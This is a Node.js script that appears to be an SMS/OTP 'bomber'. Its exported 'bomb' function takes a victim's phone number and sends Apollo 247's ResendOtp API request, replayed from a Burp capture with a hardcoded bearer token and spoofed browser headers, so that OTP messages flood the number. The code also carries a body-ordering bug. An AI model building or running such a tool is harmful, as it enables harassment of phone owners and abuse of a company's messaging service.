const request = require('request');
const express = require('express');
 

 const app = express();
 const bot = require('./bot')
//process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0


var mobileNumber = "0";
var burp0_bodyString = "{\"operationName\":\"ResendOtp\",\"variables\":{\"mobileNumber\":\"+91" + mobileNumber + "\",\"id\":\"0dab53e0-ab87-11ed-a7e2-55e784e1a46e\",\"loginType\":\"PATIENT\"},\"query\":\"query ResendOtp($mobileNumber: String!, $id: String!, $loginType: LOGIN_TYPE!) {\\n  resendOtp(mobileNumber: $mobileNumber, id: $id, loginType: $loginType) {\\n    status\\n    message\\n    loginId\\n    __typename\\n  }\\n}\\n\"}";

  


exports.bomb =(num)=>{
  mobileNumber=num;


var burp0_headers = {
  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0", 
  "Accept": "*/*", 
  "Accept-Language": "en-US,en;q=0.5", 
  "Accept-Encoding": "gzip, deflate", 
  "Referer": "https://www.apollopharmacy.in/", 
  "Content-Type": "application/json", 
  "Authorization": "Bearer 3d1833da7020e0602165529446587434", 
  "Content-Length": "371", 
  "Origin": "https://www.apollopharmacy.in", 
  "Sec-Fetch-Dest": "empty", 
  "Sec-Fetch-Mode": "cors", 
  "Sec-Fetch-Site": "cross-site", 
  "Te": "trailers", 
  "Connection": "close"
}

var burp0_options = {
  url: "https://webapi.apollo247.com:443/",
  headers: burp0_headers,
  method: "post",
  body: burp0_bodyString
}

  burp0_bodyString = "{\"operationName\":\"ResendOtp\",\"variables\":{\"mobileNumber\":\"+91" + mobileNumber + "\",\"id\":\"0dab53e0-ab87-11ed-a7e2-55e784e1a46e\",\"loginType\":\"PATIENT\"},\"query\":\"query ResendOtp($mobileNumber: String!, $id: String!, $loginType: LOGIN_TYPE!) {\\n  resendOtp(mobileNumber: $mobileNumber, id: $id, loginType: $loginType) {\\n    status\\n    message\\n    loginId\\n    __typename\\n  }\\n}\\n\"}";

  request(burp0_options, function (error, response, body) {
    if (error) {
      console.log({ error });
    } else {
     console.log({ body });
    }
  });

  mobileNumber=0


}

app.get('/bob', (req, res) => {

   

  
      res.send("live");
   
});




module.exports =app
